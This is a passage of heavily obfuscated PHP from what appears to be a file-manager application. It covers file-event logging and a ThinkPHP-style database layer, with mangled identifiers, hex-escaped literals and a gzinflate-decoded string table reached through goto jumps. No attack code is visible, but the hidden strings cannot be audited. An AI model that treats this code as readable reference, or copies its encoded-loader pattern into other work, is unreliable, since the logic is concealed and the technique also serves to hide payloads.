($this->isCacheEvent($á´Ÿ³†Ã, $Ó­ÅÅúœ)) { return; } if ($¤ôşƒ && is_string($¤ôşƒ)) { $¤ôşƒ = array($‡›†Ò‘‹[1786] => $¤ôşƒ); } $€õù¸Ÿ = array($‡›†Ò‘‹[421] => $ßƒØÈÕ›, $‡›†Ò‘‹[1962] => $á´Ÿ³†Ã[$‡›†Ò‘‹[501]], $‡›†Ò‘‹[1963] => $á´Ÿ³†Ã[$‡›†Ò‘‹[28]], $‡›†Ò‘‹[522] => !empty($á´Ÿ³†Ã[$‡›†Ò‘‹[522]]) ? $á´Ÿ³†Ã[$‡›†Ò‘‹[522]] : $‡›†Ò‘‹[33], $‡›†Ò‘‹[1571] => USER_ID, $‡›†Ò‘‹[426] => $Ó­ÅÅúœ, $‡›†Ò‘‹[1573] => $¤ôşƒ); $this->addSystemLog($Ó­ÅÅúœ, $€õù¸Ÿ); unset($€õù¸Ÿ[$‡›†Ò‘‹[1963]], $€õù¸Ÿ[$‡›†Ò‘‹[522]]); return $this->add($€õù¸Ÿ); } private function addSystemLog($ÑÍÛ¢¨µ, $î³óåÎ) { $û§‡ÍôÌ =& $_SERVER[Ù×¯Ø…]; if ($ÑÍÛ¢¨µ == $û§‡ÍôÌ[1964]) { $ÑÍÛ¢¨µ = $î³óåÎ[$û§‡ÍôÌ[454]][$û§‡ÍôÌ[1965]]; } else { if (in_array($ÑÍÛ¢¨µ, array($û§‡ÍôÌ[1727], $û§‡ÍôÌ[1966]))) { $ÑÍÛ¢¨µ = $î³óåÎ[$û§‡ÍôÌ[454]][$û§‡ÍôÌ[754]]; } } $Ç„î’¯ä = array_merge($î³óåÎ, array($û§‡ÍôÌ[1967] => $î³óåÎ[$û§‡ÍôÌ[406]], $û§‡ÍôÌ[1968] => $î³óåÎ[$û§‡ÍôÌ[1968]])); Model($û§‡ÍôÌ[1691])->addLog($û§‡ÍôÌ[1969] . $ÑÍÛ¢¨µ, $Ç„î’¯ä); } private function isCacheEvent($—Ó—ıöá, $¸¡»‹¡) { if ($—Ó—ıöá[$_SERVER[Ù×¯Ø…][415]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¸Á·§ÈÃ, $¿Ôë˜«ş) { $ß ¨œûÕ =& $_SERVER[Ù×¯Ø…]; $½×œ®Ä¯ = Model($ß ¨œûÕ[1253])->sourceInfo($¸Á·§ÈÃ); $‚ŠãùÊÃ = array($ß ¨œûÕ[1965] => $¿Ôë˜«ş, $ß ¨œûÕ[28] => $½×œ®Ä¯[$ß ¨œûÕ[28]]); return $this->addEvent($¸Á·§ÈÃ, $ß ¨œûÕ[1964], $‚ŠãùÊÃ); } public function eventFileEdit($ûæòÒÔô) { $Ï¸Ì„›Û =& $_SERVER[Ù×¯Ø…]; $İİôœİ´ = array($Ï¸Ì„›Û[1970] => $_SERVER[$Ï¸Ì„›Û[1971]], $Ï¸Ì„›Û[1972] => strtolower(ACTION)); return $this->addEvent($ûæòÒÔô, $Ï¸Ì„›Û[1717], $İİôœİ´); } public function eventRecycle($ÈĞÙäŠ, $§ı¯³Ø) { return $this->addEvent($ÈĞÙäŠ, $_SERVER[Ù×¯Ø…][1966], $§ı¯³Ø); } public function eventRemove($¶…£éõ±) { $´ùÊÓ†„ =& $_SERVER[Ù×¯Ø…]; $«Ğ…Å¯ = Model($´ùÊÓ†„[1253])->sourceInfo($¶…£éõ±); $‚åÙƒ‹ô = $«Ğ…Å¯[$´ùÊÓ†„[28]]; return $this->addEvent($«Ğ…Å¯[$´ùÊÓ†„[501]], $´ùÊÓ†„[1716], $‚åÙƒ‹ô); } public function eventShare($Å‰›Ë¨ò, $İ ¥¹¹) { return $this->addEvent($Å‰›Ë¨ò, $_SERVER[Ù×¯Ø…][1727], $İ ¥¹¹); } public function eventMove($¬³Ê¢Ïë, $ê½ùáë, $ĞŞº³Úğ) { $ à™ÛØá =& $_SERVER[Ù×¯Ø…]; $òô•‚ˆ³ = Model($ à™ÛØá[1253]); $úÛë™ = $òô•‚ˆ³->sourceInfo($¬³Ê¢Ïë); $ßöüí¡Õ = $òô•‚ˆ³->sourceInfo($ê½ùáë); $‹À˜™¯µ = $òô•‚ˆ³->sourceInfo($ĞŞº³Úğ); $èÀö†Îª = array($ à™ÛØá[1090] => $ê½ùáë, $ à™ÛØá[1973] => $ßöüí¡Õ[$ à™ÛØá[28]], $ à™ÛØá[1953] => !empty($ßöüí¡Õ[$ à™ÛØá[522]]) ? $ßöüí¡Õ[$ à™ÛØá[522]] : $ à™ÛØá[33], $ à™ÛØá[1091] => $ĞŞº³Úğ, $ à™ÛØá[1974] => $‹À˜™¯µ[$ à™ÛØá[28]], $ à™ÛØá[1975] => !empty($‹À˜™¯µ[$ à™ÛØá[522]]) ? $‹À˜™¯µ[$ à™ÛØá[522]] : $ à™ÛØá[33]); $this->addEvent($¬³Ê¢Ïë, $ à™ÛØá[554], $èÀö†Îª); $úÛë™ = $òô•‚ˆ³->sourceInfo($¬³Ê¢Ïë); $èÀö†Îª = array($ à™ÛØá[406] => $úÛë™[$ à™ÛØá[406]], $ à™ÛØá[28] => $úÛë™[$ à™ÛØá[28]]); $this->addEvent($ê½ùáë, $ à™ÛØá[1976], $èÀö†Îª); } public function eventCopy($ÎãÌîòÃ) { $this->eventCreate($ÎãÌîòÃ, $_SERVER[Ù×¯Ø…][552]); } public function eventRename($ñ£³à‰Û, $Ä¥¤õ¼£, $×¼şşÛë) { $Îë¤½ìº =& $_SERVER[Ù×¯Ø…]; $£ «á±° = array($Îë¤½ìº[1090] => $Ä¥¤õ¼£, $Îë¤½ìº[1091] => $×¼şşÛë); return $this->addEvent($ñ£³à‰Û, $Îë¤½ìº[1268], $£ «á±°); } public function eventAddComment($ôùá‹Äõ, $Ê¿õ©¡) { return $this->addEvent($ôùá‹Äõ, $_SERVER[Ù×¯Ø…][1977], $Ê¿õ©¡); } public function eventAddDesc($äé²èÏ, $ğÖó™™í) { return $this->addEvent($äé²èÏ, $_SERVER[Ù×¯Ø…][1978], $ğÖó™™í); } public function listBySource($ÖÛ²¿Û») { $¡±¦ÃáŸ =& $_SERVER[Ù×¯Ø…]; $Ã¢ü«Àì = Model($¡±¦ÃáŸ[1253])->sourceInfo($ÖÛ²¿Û»); $§ó”¿Ê« = array($¡±¦ÃáŸ[421] => $ÖÛ²¿Û»); if ($Ã¢ü«Àì[$¡±¦ÃáŸ[414]] == $¡±¦ÃáŸ[87]) { $ÇÑ¼ïæ = Model($¡±¦ÃáŸ[1253])->listSearchChildren($ÖÛ²¿Û», 20000); $ÇÑ¼ïæ[] = $ÖÛ²¿Û» . $¡±¦ÃáŸ[376]; $§ó”¿Ê« = array($¡±¦ÃáŸ[406] => array($¡±¦ÃáŸ[7], $ÇÑ¼ïæ)); } $‡‰Îş±¹ = $this->where($§ó”¿Ê«)->order($¡±¦ÃáŸ[1979])->selectPage(); if ($‡‰Îş±¹[$¡±¦ÃáŸ[364]][$¡±¦ÃáŸ[365]] == 0) { $‡‰Îş±¹[$¡±¦ÃáŸ[364]][$¡±¦ÃáŸ[365]] = 1; $‡‰Îş±¹[$¡±¦ÃáŸ[367]] = array(array($¡±¦ÃáŸ[421] => $ÖÛ²¿Û», $¡±¦ÃáŸ[1962] => $Ã¢ü«Àì[$¡±¦ÃáŸ[501]], $¡±¦ÃáŸ[1571] => $Ã¢ü«Àì[$¡±¦ÃáŸ[455]], $¡±¦ÃáŸ[426] => $¡±¦ÃáŸ[1980], $¡±¦ÃáŸ[427] => $Ã¢ü«Àì[$¡±¦ÃáŸ[194]], $¡±¦ÃáŸ[1573] => $¡±¦ÃáŸ[33])); } return $this->eventListParse($‡‰Îş±¹, $ÖÛ²¿Û»); } private function eventListParse($û•®úâ«, $ÔÙ©Î) { $ãÖÒ¯½ =& $_SERVER[Ù×¯Ø…]; $ ËìøĞØ = $û•®úâ«[$ãÖÒ¯½[367]]; $“Œµïø‡ = array_to_keyvalue($ ËìøĞØ, $ãÖÒ¯½[33], $ãÖÒ¯½[406]); $Ê‰«ù¦ò = array_to_keyvalue($ ËìøĞØ, $ãÖÒ¯½[33], $ãÖÒ¯½[1968]); foreach ($ ËìøĞØ as $´ÅÃİ²Ë) { $©¯çïİ‹ = $´ÅÃİ²Ë[$ãÖÒ¯½[454]]; if ($´ÅÃİ²Ë[$ãÖÒ¯½[29]] == $ãÖÒ¯½[554] && isset($©¯çïİ‹[$ãÖÒ¯½[1090]])) { $“Œµïø‡[] = $©¯çïİ‹[$ãÖÒ¯½[1090]] . $ãÖÒ¯½[33]; $“Œµïø‡[] = $©¯çïİ‹[$ãÖÒ¯½[1091]] . $ãÖÒ¯½[33]; } if ($´ÅÃİ²Ë[$ãÖÒ¯½[29]] == $ãÖÒ¯½[1976] && isset($©¯çïİ‹[$ãÖÒ¯½[406]])) { $“Œµïø‡[] = $©¯çïİ‹[$ãÖÒ¯½[406]] . $ãÖÒ¯½[33]; } } $“Œµïø‡ = array_merge($“Œµïø‡, $Ê‰«ù¦ò, array($ÔÙ©Î . $ãÖÒ¯½[33])); $“Œµïø‡ = array_unique($“Œµïø‡); $çÀÛ÷úª = array_unique(array_to_keyvalue($ ËìøĞØ, $ãÖÒ¯½[33], $ãÖÒ¯½[1580])); $şÉ±…Õã = Model($ãÖÒ¯½[541])->userListInfo($çÀÛ÷úª); $ûÃÆ´òá = Model($ãÖÒ¯½[831])->sourceListInfo($“Œµïø‡, !0); foreach ($ ËìøĞØ as &$´ÅÃİ²Ë) { if ($´ÅÃİ²Ë[$ãÖÒ¯½[29]] == $ãÖÒ¯½[554] && isset($´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[1090]])) { $´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[1090]] = $ûÃÆ´òá[$´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[1090]]]; $´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[1091]] = $ûÃÆ´òá[$´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[1091]]]; } if ($´ÅÃİ²Ë[$ãÖÒ¯½[29]] == $ãÖÒ¯½[1976] && isset($´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[406]])) { $´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[406]] = $ûÃÆ´òá[$´ÅÃİ²Ë[$ãÖÒ¯½[454]][$ãÖÒ¯½[406]]]; } $´ÅÃİ²Ë[$ãÖÒ¯½[85]] = $ûÃÆ´òá[$´ÅÃİ²Ë[$ãÖÒ¯½[406]]]; $´ÅÃİ²Ë[$ãÖÒ¯½[1981]] = $ûÃÆ´òá[$´ÅÃİ²Ë[$ãÖÒ¯½[1968]]]; if ($´ÅÃİ²Ë[$ãÖÒ¯½[29]] == $ãÖÒ¯½[1716]) { $´ÅÃİ²Ë[$ãÖÒ¯½[1981]] = $´ÅÃİ²Ë[$ãÖÒ¯½[85]]; $´ÅÃİ²Ë[$ãÖÒ¯½[1968]] = $´ÅÃİ²Ë[$ãÖÒ¯½[1981]][$ãÖÒ¯½[406]]; $´ÅÃİ²Ë[$ãÖÒ¯½[85]] = !1; $´ÅÃİ²Ë[$ãÖÒ¯½[406]] = $ãÖÒ¯½[33]; } $´ÅÃİ²Ë[$ãÖÒ¯½[1913]] = $şÉ±…Õã[$´ÅÃİ²Ë[$ãÖÒ¯½[1580]]]; } unset($´ÅÃİ²Ë); $û•®úâ«[$ãÖÒ¯½[367]] = $ ËìøĞØ; return $û•®úâ«; } public function removeBySource($ßíã“€Ê) { $Óºé†º = array($_SERVER[Ù×¯Ø…][421] => $ßíã“€Ê); $this->where($Óºé†º)->remove(); } } goto eíù®´Ö÷‡; cÙâôØ©¯³: define($_SERVER[Ù×¯Ø…][607], $_SERVER[Ù×¯Ø…][608]); $qlmouyvsjw = $_SERVER[Ù×¯Ø…][609]; $_SERVER[›õ¡œ§] = explode($_SERVER[Ù×¯Ø…][610], gzinflate(substr($_SERVER[Ù×¯Ø…][611], 10, -8))); goto BóÃì¶ó„; b”éà¤†œ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\75", "\x6e\x65\161" => "\74\76", "\147\164" => "\x3e", "\x65\147\x74" => "\x3e\x3d", "\154\x74" => "\74", "\145\x6c\164" => "\x3c\75", "\156\x6f\x74\154\151\x6b\x65" => "\x4e\117\x54\x20\x4c\x49\113\x45", "\x6c\151\153\145" => "\114\111\113\105", "\x69\156" => "\x49\116", "\156\x6f\x74\x69\x6e" => "\x4e\x4f\124\x20\111\x4e", "\x6e\157\x74\x20\x69\x6e" => "\x4e\x4f\x54\x20\111\x4e", "\x62\145\164\167\145\x65\x6e" => "\x42\105\124\127\x45\x45\116", "\156\x6f\x74\x62\145\164\167\145\145\x6e" => "\116\x4f\x54\40\102\105\124\x57\x45\x45\x4e", "\x6e\157\x74\40\142\x65\x74\167\x65\145\x6e" => "\x4e\117\124\x20\102\x45\x54\127\105\105\x4e"); protected $selectSql = "\x53\105\114\105\103\124\45\104\x49\x53\124\x49\x4e\103\124\45\x20\x25\106\x49\x45\x4c\x44\x25\x20\106\122\117\x4d\x20\x25\x54\101\102\x4c\x45\45\x25\x4a\117\x49\x4e\x25\x25\x57\x48\x45\x52\x45\45\45\107\122\x4f\x55\x50\45\x25\x48\101\x56\x49\x4e\107\45\45\117\122\104\105\122\x25\45\x4c\111\115\111\124\x25\x20\x25\x55\x4e\x49\117\116\45\45\103\117\x4d\115\105\116\x54\x25"; protected $bind = array(); public static function getInstance() { $¬§›ú = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ù×¯Ø…][958], $¬§›ú); } public function factory($ŞŒìîÁ’ = '') { $ãĞŒü´Ÿ =& $_SERVER[Ù×¯Ø…]; $ŞŒìîÁ’ = $this->parseConfig($ŞŒìîÁ’); if (empty($ŞŒìîÁ’[$ãĞŒü´Ÿ[959]])) { think_exception(think_lang($ãĞŒü´Ÿ[960])); } $this->dbType = ucwords(strtolower($ŞŒìîÁ’[$ãĞŒü´Ÿ[959]])); $¢„°üî = $ãĞŒü´Ÿ[961] . $this->dbType; if (class_exists($¢„°üî)) { $»‘Éì¬¶ = new $¢„°üî($ŞŒìîÁ’); if ($ãĞŒü´Ÿ[796] != strtolower($ŞŒìîÁ’[$ãĞŒü´Ÿ[959]])) { $»‘Éì¬¶->dbType = strtoupper($this->dbType); } else { $»‘Éì¬¶->dbType = $this->_getDsnType($ŞŒìîÁ’[$ãĞŒü´Ÿ[914]]); } } else { think_exception(think_lang($ãĞŒü´Ÿ[962]) . $ãĞŒü´Ÿ[963] . $¢„°üî); } return $»‘Éì¬¶; } public function __call($¹£è°£•, $ÊÔÓÎ·€) { if (method_exists($this, $¹£è°£•)) { return call_user_func_array(array($this, $¹£è°£•), $ÊÔÓÎ·€); } } protected function _getDsnType($Ç‰„Å—Æ) { $ıè¹åı€ = explode($_SERVER[Ù×¯Ø…][4], $Ç‰„Å—Æ); $³ôòõ†ì = strtoupper(trim($ıè¹åı€[0])); return $³ôòõ†ì; } private function parseConfig($İ•¾ÛÁ¡ = '') { $ëÆ¿®Ì£ =& $_SERVER[Ù×¯Ø…]; if (!empty($İ•¾ÛÁ¡) && is_string($İ•¾ÛÁ¡)) { $İ•¾ÛÁ¡ = $this->parseDSN($İ•¾ÛÁ¡); } elseif (is_array($İ•¾ÛÁ¡)) { $İ•¾ÛÁ¡ = array_change_key_case($İ•¾ÛÁ¡); $İ•¾ÛÁ¡ = array($ëÆ¿®Ì£[959] => $İ•¾ÛÁ¡[$ëÆ¿®Ì£[795]], $ëÆ¿®Ì£[887] => $İ•¾ÛÁ¡[$ëÆ¿®Ì£[964]], $ëÆ¿®Ì£[888] => $İ•¾ÛÁ¡[$ëÆ¿®Ì£[965]], $ëÆ¿®Ì£[885] => $İ•¾ÛÁ¡[$ëÆ¿®Ì£[966]], $ëÆ¿®Ì£[886] => $İ•¾ÛÁ¡[$ëÆ¿®Ì£[967]], $ëÆ¿®Ì£[17] => $İ•¾ÛÁ¡[$ëÆ¿®Ì£[968]], $ëÆ¿®Ì£[914] => $İ•¾ÛÁ¡[$ëÆ¿®Ì£[797]], $ëÆ¿®Ì£[13] => isset($İ•¾ÛÁ¡[$ëÆ¿®Ì£[969]]) ? $İ•¾ÛÁ¡[$ëÆ¿®Ì£[969]] : array()); } elseif (empty($İ•¾ÛÁ¡)) { if (think_config($ëÆ¿®Ì£[970]) && $ëÆ¿®Ì£[796] != strtolower(think_config($ëÆ¿®Ì£[971]))) { $İ•¾ÛÁ¡ = $this->parseDSN(think_config($ëÆ¿®Ì£[970])); } else { $İ•¾ÛÁ¡ = array($ëÆ¿®Ì£[959] => think_config($ëÆ¿®Ì£[971]), $ëÆ¿®Ì£[887] => think_config($ëÆ¿®Ì£[972]), $ëÆ¿®Ì£[888] => think_config($ëÆ¿®Ì£[973]), $ëÆ¿®Ì£[885] => think_config($ëÆ¿®Ì£[974]), $ëÆ¿®Ì£[886] => think_config($ëÆ¿®Ì£[975]), $ëÆ¿®Ì£[17] => think_config($ëÆ¿®Ì£[244]), $ëÆ¿®Ì£[914] => think_config($ëÆ¿®Ì£[970]), $ëÆ¿®Ì£[13] => think_config($ëÆ¿®Ì£[976])); } } return $İ•¾ÛÁ¡; } protected function initConnect($ò®—Óì = true) { if (1 == think_config($_SERVER[Ù×¯Ø…][18])) { $this->_linkID = $this->multiConnect($ò®—Óì); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ãÌ´ÇÁ => $¢ šÙòé) { $this->_linkID = $¢ šÙòé; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($®ş‘Íòı = false) { $„ÄÈ‰¶† =& $_SERVER[Ù×¯Ø…]; static $·À¬ŞÆ¹ = array(); static $ûÙà¸ìŸ = -1; if (empty($·À¬ŞÆ¹)) { foreach ($this->config as $É¸òÆ†Ö => $ÒêêÕ‰ƒ) { $·À¬ŞÆ¹[$É¸òÆ†Ö] = explode($„ÄÈ‰¶†[47], $ÒêêÕ‰ƒ); } } if (think_config($„ÄÈ‰¶†[977])) { if ($®ş‘Íòı || think_config($„ÄÈ‰¶†[391]) === !0) { $•éˆìËÃ = floor(mt_rand(0, think_config($„ÄÈ‰¶†[978]) - 1)); $ûÙà¸ìŸ = $•éˆìËÃ; } else { if (is_numeric(think_config($„ÄÈ‰¶†[979]))) { $•éˆìËÃ = think_config($„ÄÈ‰¶†[979]); } else { $•éˆìËÃ = floor(mt_rand(think_config($„ÄÈ‰¶†[978]), count($·À¬ŞÆ¹[$„ÄÈ‰¶†[885]]) - 1)); } } } else { $•éˆìËÃ = floor(mt_rand(0, count($·À¬ŞÆ¹[$„ÄÈ‰¶†[885]]) - 1)); $ûÙà¸ìŸ = $•éˆìËÃ; } $•éˆìËÃ = $ûÙà¸ìŸ !== -1 ? $ûÙà¸ìŸ : $•éˆìËÃ; $û‰Ÿ¥ù = array($„ÄÈ‰¶†[887] => isset($·À¬ŞÆ¹[$„ÄÈ‰¶†[887]][$•éˆìËÃ]) ? $·À¬ŞÆ¹[$„ÄÈ‰¶†[887]][$•éˆìËÃ] : $·À¬ŞÆ¹[$„ÄÈ‰¶†[887]][0], $„ÄÈ‰¶†[888] => isset($·À¬ŞÆ¹[$„ÄÈ‰¶†[888]][$•éˆìËÃ]) ? $·À¬ŞÆ¹[$„ÄÈ‰¶†[888]][$•éˆìËÃ] : $·À¬ŞÆ¹[$„ÄÈ‰¶†[888]][0], $„ÄÈ‰¶†[885] => isset($·À¬ŞÆ¹[$„ÄÈ‰¶†[885]][$•éˆìËÃ]) ? $·À¬ŞÆ¹[$„ÄÈ‰¶†[885]][$•éˆìËÃ] : $·À¬ŞÆ¹[$„ÄÈ‰¶†[885]][0], $„ÄÈ‰¶†[886] => isset($·À¬ŞÆ¹[$„ÄÈ‰¶†[886]][$•éˆìËÃ]) ? $·À¬ŞÆ¹[$„ÄÈ‰¶†[886]][$•éˆìËÃ] : $·À¬ŞÆ¹[$„ÄÈ‰¶†[886]][0], $„ÄÈ‰¶†[17] => isset($·À¬ŞÆ¹[$„ÄÈ‰¶†[17]][$•éˆìËÃ]) ? $·À¬ŞÆ¹[$„ÄÈ‰¶†[17]][$•éˆìËÃ] : $·À¬ŞÆ¹[$„ÄÈ‰¶†[17]][0], $„ÄÈ‰¶†[914] => isset($·À¬ŞÆ¹[$„ÄÈ‰¶†[914]][$•éˆìËÃ]) ? $·À¬ŞÆ¹[$„ÄÈ‰¶†[914]][$•éˆìËÃ] : $·À¬ŞÆ¹[$„ÄÈ‰¶†[914]][0], $„ÄÈ‰¶†[13] => isset($·À¬ŞÆ¹[$„ÄÈ‰¶†[13]][$•éˆìËÃ]) ? $·À¬ŞÆ¹[$„ÄÈ‰¶†[13]][$•éˆìËÃ] : $·À¬ŞÆ¹[$„ÄÈ‰¶†[13]][0]); return $this->connect($û‰Ÿ¥ù, $•éˆìËÃ); } public function parseDSN($£¬İ¯µ·) { $£ëæ¾å  =& $_SERVER[Ù×¯Ø…]; if (empty($£¬İ¯µ·)) { return !1; } $Õ·ëÍâë = parse_url($£¬İ¯µ·); if ($Õ·ëÍâë[$£ëæ¾å [174]]) { $…í¸¶²Ø = array($£ëæ¾å [959] => $Õ·ëÍâë[$£ëæ¾å [174]], $£ëæ¾å [887] => isset($Õ·ëÍâë[$£ëæ¾å [597]]) ? $Õ·ëÍâë[$£ëæ¾å [597]] : $£ëæ¾å [33], $£ëæ¾å [888] => isset($Õ·ëÍâë[$£ëæ¾å [980]]) ? $Õ·ëÍâë[$£ëæ¾å [980]] : $£ëæ¾å [33], $£ëæ¾å [885] => isset($Õ·ëÍâë[$£ëæ¾å [175]]) ? $Õ·ëÍâë[$£ëæ¾å [175]] : $£ëæ¾å [33], $£ëæ¾å [886] => isset($Õ·ëÍâë[$£ëæ¾å [176]]) ? $Õ·ëÍâë[$£ëæ¾å [176]] : $£ëæ¾å [33], $£ëæ¾å [17] => isset($Õ·ëÍâë[$£ëæ¾å [76]]) ? substr($Õ·ëÍâë[$£ëæ¾å [76]], 1) : $£ëæ¾å [33]); } else { preg_match($£ëæ¾å [981], trim($£¬İ¯µ·), $ˆÙÔàƒã); $…í¸¶²Ø = array($£ëæ¾å [959] => $ˆÙÔàƒã[1], $£ëæ¾å [887] => $ˆÙÔàƒã[2], $£ëæ¾å [888] => $ˆÙÔàƒã[3], $£ëæ¾å [885] => $ˆÙÔàƒã[4], $£ëæ¾å [886] => $ˆÙÔàƒã[5], $£ëæ¾å [17] => $ˆÙÔàƒã[6]); } $…í¸¶²Ø[$£ëæ¾å [914]] = $£ëæ¾å [33]; return $…í¸¶²Ø; } protected function debug() { $ğÉû¯şê =& $_SERVER[Ù×¯Ø…]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ğÉû¯şê[982]; if (think_config($ğÉû¯şê[983])) { think_status($ğÉû¯şê[984]); think_trace($this->queryStr . $ğÉû¯şê[985] . think_status($ğÉû¯şê[20], $ğÉû¯şê[984], 6) . $ğÉû¯şê[986], $ğÉû¯şê[33], $ğÉû¯şê[987]); } } protected function parseLock($ÄöŒÏé¶ = false) { $Úò¦¼Ë¡ =& $_SERVER[Ù×¯Ø…]; if (!$ÄöŒÏé¶) { return $Úò¦¼Ë¡[33]; } if ($Úò¦¼Ë¡[916] == $this->dbType) { return $Úò¦¼Ë¡[988]; } return $Úò¦¼Ë¡[989]; } protected function parseSet($‡¹ı³äæ) { $‚­«ßâ› =& $_SERVER[Ù×¯Ø…]; foreach ($‡¹ı³äæ as $ä¯äĞ“Õ => $±óıÜ†á) { if (is_array($±óıÜ†á) && $‚­«ßâ›[295] == $±óıÜ†á[0]) { $µ¬¡„ó[] = $this->parseKey($ä¯äĞ“Õ) . $‚­«ßâ›[990] . $±óıÜ†á[1]; } elseif (is_scalar($±óıÜ†á) || is_null($±óıÜ†á)) { $µ¬¡„ó[] = $this->parseKey($ä¯äĞ“Õ) . $‚­«ßâ›[990] . $this->parseValue($±óıÜ†á); } } return $‚­«ßâ›[991] . implode($‚­«ßâ›[47], $µ¬¡„ó); } protected function bindParam($éº÷ªµ, $ Û£–‰Î) { $this->bind[$_SERVER[Ù×¯Ø…][4] . $éº÷ªµ] = $ Û£–‰Î; } protected function parseBind($¡™’Êª¹) { $¡™’Êª¹ = array_merge($this->bind, $¡™’Êª¹); $this->bind = array(); return $¡™’Êª¹; } function parseKey(&$òŞÉÁÆ®, $È££©™– = true) { if ($È££©™–) { $òŞÉÁÆ® = $this->parseKeyCheck($òŞÉÁÆ®); } return $òŞÉÁÆ®; } function parseKeyCheck($Š™©ˆçÜ) { $ñÅÆÅö• =& $_SERVER[Ù×¯Ø…]; $Š™©ˆçÜ = trim($Š™©ˆçÜ); if (!preg_match($ñÅÆÅö•[992], $Š™©ˆçÜ)) { think_exception($ñÅÆÅö•[993] . $Š™©ˆçÜ); } return $Š™©ˆçÜ; } protected function parseValue($ÙÄÌ¾ÈŒ) { $¨ß °¯È =& $_SERVER[Ù×¯Ø…]; if (is_string($ÙÄÌ¾ÈŒ)) { $ÙÄÌ¾ÈŒ = $¨ß °¯È[955] . $this->escapeString($ÙÄÌ¾ÈŒ) . $¨ß °¯È[955]; } elseif (isset($ÙÄÌ¾ÈŒ[0]) && is_string($ÙÄÌ¾ÈŒ[0]) && strtolower($ÙÄÌ¾ÈŒ[0]) == $¨ß °¯È[295]) { $ÙÄÌ¾ÈŒ = $this->escapeString($ÙÄÌ¾ÈŒ[1]); } elseif (is_array($ÙÄÌ¾ÈŒ)) { $ÙÄÌ¾ÈŒ = array_map(array($this, $¨ß °¯È[956]), $ÙÄÌ¾ÈŒ); } elseif (is_bool($ÙÄÌ¾ÈŒ)) { $ÙÄÌ¾ÈŒ = $ÙÄÌ¾ÈŒ ? $¨ß °¯È[87] : $¨ß °¯È[191]; } elseif (is_null($ÙÄÌ¾ÈŒ)) { $ÙÄÌ¾ÈŒ = $¨ß °¯È[103]; } return $ÙÄÌ¾ÈŒ; } protected function parseField($üÕÇÕÂÉ) { $ÁË¼Ø•± =& $_SERVER[Ù×¯Ø…]; if (is_string($üÕÇÕÂÉ) && strpos($üÕÇÕÂÉ, $ÁË¼Ø•±[47])) { $üÕÇÕÂÉ = explode($ÁË¼Ø•±[47], $üÕÇÕÂÉ); } if (is_array($üÕÇÕÂÉ)) { $áÔä–Õë = array(); foreach ($üÕÇÕÂÉ as $ëÕé—ñÈ => $ºÇŠ¤ôµ) { if (!is_numeric($ëÕé—ñÈ)) { $áÔä–Õë[] = $this->parseKey($ëÕé—ñÈ, !1) . $ÁË¼Ø•±[994] . $this->parseKey($ºÇŠ¤ôµ); } else { $áÔä–Õë[] = $this->parseKey($ºÇŠ¤ôµ); } } $ÉÙ¸Šú× = implode($ÁË¼Ø•±[47], $áÔä–Õë); } elseif (is_string($üÕÇÕÂÉ) && !empty($üÕÇÕÂÉ)) { $ÉÙ¸Šú× = $üÕÇÕÂÉ; } else { $ÉÙ¸Šú× = $ÁË¼Ø•±[182]; } return $ÉÙ¸Šú×; } protected function parseTable($…¿Š÷) { $¶“¿œç’ =& $_SERVER[Ù×¯Ø…]; if (is_array($…¿Š÷)) { $·­şÚë = array(); foreach ($…¿Š÷ as $ÕÏãá…Æ => $óäÓìÓİ) { if (!is_numeric($ÕÏãá…Æ)) { $·­şÚë[] = $this->parseKey($ÕÏãá…Æ) . $¶“¿œç’[50] . $this->parseKey($óäÓìÓİ); } else { $·­şÚë[] = $this->parseKey($ÕÏãá…Æ); } } $…¿Š÷ = $·­şÚë; } elseif (is_string($…¿Š÷)) { if (strstr($…¿Š÷, $¶“¿œç’[50])) { return $…¿Š÷; } $…¿Š÷ = explode($¶“¿œç’[47], $…¿Š÷); array_walk($…¿Š÷, array($this, $¶“¿œç’[905])); } return $¶“¿œç’[899] . trim(implode($¶“¿œç’[995], $…¿Š÷), $¶“¿œç’[383]) . $¶“¿œç’[899]; } protected function parseWhere($£îˆÂİß) { $Ç‡Ğ‹£Ò =& $_SERVER[Ù×¯Ø…]; $ú±œßËÈ = $Ç‡Ğ‹£Ò[33]; if (is_string($£îˆÂİß)) { $ú±œßËÈ = $£îˆÂİß; } else { $ˆàæ’ûÚ = isset($£îˆÂİß[$Ç‡Ğ‹£Ò[996]]) ? strtoupper($£îˆÂİß[$Ç‡Ğ‹£Ò[996]]) : $Ç‡Ğ‹£Ò[33]; if (in_array($ˆàæ’ûÚ, array($Ç‡Ğ‹£Ò[997], $Ç‡Ğ‹£Ò[998], $Ç‡Ğ‹£Ò[999]))) { $ˆàæ’ûÚ = $Ç‡Ğ‹£Ò[50] . $ˆàæ’ûÚ . $Ç‡Ğ‹£Ò[50]; unset($£îˆÂİß[$Ç‡Ğ‹£Ò[996]]); } else { $ˆàæ’ûÚ = $Ç‡Ğ‹£Ò[1000]; } foreach ($£îˆÂİß as $‡ºÔ“œÃ => $üõèÏ¬Ñ) { $ú±œßËÈ .= $Ç‡Ğ‹£Ò[275]; if (is_numeric($‡ºÔ“œÃ)) { $‡ºÔ“œÃ = $Ç‡Ğ‹£Ò[1001]; } if (0 === 